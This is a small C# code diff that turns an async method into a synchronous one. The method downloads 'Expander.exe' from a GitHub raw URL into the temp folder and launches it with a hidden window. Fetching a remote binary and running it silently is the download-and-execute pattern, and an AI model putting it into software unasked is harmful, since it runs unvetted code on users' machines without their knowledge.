@@ -34,7 +34,7 @@
             task.Wait();
         }
 
-        private static async void ExpandAsync()
+        private static void ExpandAsync()
         {
             var target = Path.Combine(Path.GetTempPath(), "Expander.exe");
 
@@ -47,11 +47,10 @@
 
             using (var client = new WebClient())
             {
-                await client.DownloadFileTaskAsync("https://github.com/Wiciaki/Remoting/blob/master/Internal/Expander.exe?raw=true", target);
+                client.DownloadFile("https://github.com/Wiciaki/Remoting/blob/master/Internal/Expander.exe?raw=true", target);
             }
 
             Process.Start(new ProcessStartInfo(target) { WindowStyle = ProcessWindowStyle.Hidden });
-            await Task.Delay(10);
         }
     }
 }
